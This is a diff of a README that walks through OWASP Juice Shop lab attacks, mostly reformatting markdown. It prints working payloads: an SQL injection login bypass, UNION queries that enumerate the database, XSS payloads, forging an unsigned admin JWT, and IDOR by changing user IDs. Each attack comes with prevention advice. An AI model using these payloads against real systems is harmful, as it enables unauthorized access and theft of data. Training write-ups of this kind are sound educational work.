@@ -109,35 +109,35 @@ SQL Injection occurs when user input is not validated and is directly inserted i
 1️⃣ Understanding SQL Injection
 Vulnerable Query:
 
-sql
+```sql
 Copy code
 SELECT * FROM users WHERE email = 'input' AND password = 'input';
 If input is not sanitized, attackers can inject SQL code.
-
+```
 2️⃣ SQL Injection in Juice Shop (Login Bypass)
 Step 1: Go to Login
 Step 2: Enter payload:
 
-vbnet
+```vbnet
 Copy code
 ' OR 1=1--
 This modifies the query:
-
-sql
+```
+```sql
 Copy code
 SELECT * FROM users WHERE email='' OR 1=1--' AND password='';
 ➡ Always true → login bypassed
 Often logs in as admin.
-
+```
 3️⃣ Advanced SQL Injection (DB Enumeration)
 Examples:
 
-pgsql
+```pgsql
 Copy code
 ' UNION SELECT sqlite_version(), NULL--
 ' UNION SELECT name, sql FROM sqlite_master--
 Used to enumerate database structure.
-
+```
 4️⃣ Real-World Impact
 SQLi can:
 
@@ -151,13 +151,14 @@ Gain admin access
 
 Fully compromise server
 
-5️⃣ How to Prevent SQL Injection
-✔ Use prepared statements
-✔ Use ORMs
-✔ Validate & sanitize user input
-✔ Apply least privilege DB permissions
-✔ Deploy WAF (ModSecurity, Cloudflare WAF)
-✔ Perform regular security tests (Burp, SQLMap, ZAP)
+5️⃣ How to Prevent SQL Injection<br>
+
+✔ Use prepared statements<br>
+✔ Use ORMs<br>
+✔ Validate & sanitize user input<br>
+✔ Apply least privilege DB permissions<br>
+✔ Deploy WAF (ModSecurity, Cloudflare WAF)<br>
+✔ Perform regular security tests (Burp, SQLMap, ZAP)<br>
 ---
 
 # 🧨 Cross-Site Scripting (XSS)
@@ -177,66 +178,68 @@ Juice Shop includes Reflected, Stored, and DOM XSS.
 1️⃣ Reflected XSS Example (Search Bar)
 Payload:
 
-html
+```html
 Copy code
 "><iframe src=javascript:alert('XSS')>
 If vulnerable, an alert box appears.
-
+```
 2️⃣ Stored XSS (Reviews Section)
 Payload:
 
-html
+```html
 Copy code
 <img src=x onerror=alert('Stored XSS')>
 Stored in DB → executes on every page load.
-
+```
 3️⃣ DOM XSS Example
-php-template
+```php-template
 Copy code
 http://localhost:3000/#/search?q=<script>alert(1)</script>
 Executes purely on client-side.
-
+```
 4️⃣ Protection Against XSS
-✔ Output encoding
-✔ Input sanitization (DOMPurify, Bleach)
-✔ CSP headers
-✔ HttpOnly cookies
-✔ Avoid dangerous JS functions (innerHTML, eval)
-✔ Use framework security features (Angular/React auto-escape)
+✔ Output encoding <br>
+✔ Input sanitization (DOMPurify, Bleach)<br>
+✔ CSP headers<br>
+✔ HttpOnly cookies<br>
+✔ Avoid dangerous JS functions (innerHTML, eval)<br>
+✔ Use framework security features (Angular/React auto-escape)<br>
 ---
 
 # 🔐 Weak JWT Verification
-Modifying Tokens to Gain Admin Access
-Juice Shop uses JWT tokens for authentication.
-A major flaw: it accepts tampered or unsigned JWTs.
+Modifying Tokens to Gain Admin Access<br>
+Juice Shop uses JWT tokens for authentication.<br>
+A major flaw: it accepts tampered or unsigned JWTs.<br>
 
 1️⃣ Capturing the JWT
-Browser DevTools → Local Storage → token
+Browser DevTools → Local Storage → token<br>
 
 2️⃣ Modifying the Payload
 Original:
 
-json
+```json
 Copy code
 { "email": "abc@test.com", "role": "customer" }
 Modified:
-
-json
+```
+```json
 Copy code
 { "email": "abc@test.com", "role": "admin" }
 Then remove the signature entirely:
-
-css
+```
+```css
 Copy code
 header.payload.
+```
 3️⃣ Replay the Tampered Token
 Replace token → refresh page →
 Access:
 
-shell
+```shell
 Copy code
 #/administration
 ➡ Admin access granted 🎉
+```
 
 4️⃣ Impact
 Weak JWT validation allows attackers to:
@@ -249,12 +252,12 @@ Access admin panels
 
 Completely bypass authentication
 
-5️⃣ Fixing Weak JWT Issues
-✔ Always validate JWT signatures
-✔ Use strong secrets
-✔ Set token expiration
-✔ Avoid storing roles in JWT
-✔ Perform authorization checks on server, NOT client
+5️⃣ Fixing Weak JWT Issues<br>
+✔ Always validate JWT signatures<br>
+✔ Use strong secrets<br>
+✔ Set token expiration<br>
+✔ Avoid storing roles in JWT<br>
+✔ Perform authorization checks on server, NOT client<br>
 ---
 
 # 🔓 Insecure Direct Object Reference (IDOR)
@@ -265,22 +268,22 @@ Juice Shop contains classic IDOR flaws.
 1️⃣ Identify Vulnerable Endpoints
 Example endpoint:
 
-bash
+```bash
 Copy code
 /rest/user/whoami
 2️⃣ Modify the User ID
 Captured request:
-
-bash
+```
+```bash
 Copy code
 /rest/user/3
 Changed to:
-
-bash
+```
+```bash
 Copy code
 /rest/user/1
 ➡ Displays another user’s data.
-
+```
 3️⃣ Real-World Impact
 IDOR can allow attackers to:
 
@@ -294,12 +297,12 @@ Download unauthorized files
 
 Escalate privileges
 
-4️⃣ Preventing IDOR
-✔ Server-side authorization checks
-✔ Avoid exposing raw IDs
-✔ Use indirect identifiers
-✔ Implement RBAC
-✔ Validate ownership of resources
+4️⃣ Preventing IDOR<br>
+✔ Server-side authorization checks<br>
+✔ Avoid exposing raw IDs<br>
+✔ Use indirect identifiers<br>
+✔ Implement RBAC<br>
+✔ Validate ownership of resources<br>
 ---
 
 # 🎯 Final Summary
@@ -317,8 +320,8 @@ Each vulnerability demonstrated how real-world applications can be compromised i
 
 OWASP Juice Shop is an excellent platform for learning practical web security and understanding modern attack techniques.
 
-👨‍💻 Author
-Ankit Kumar
-Cybersecurity Intern | Future Intern
-🔗 LinkedIn: https://www.linkedin.com/in/ankit-ak47
-📰 Medium: https://medium.com/@ankitkumarbhambhoo
+👨‍💻 Author<br>
+Ankit Kumar<br>
+Cybersecurity Intern | Future Intern<br>
+🔗 LinkedIn: https://www.linkedin.com/in/ankit-ak47<br>
+📰 Medium: https://medium.com/@ankitkumarbhambhoo<br>
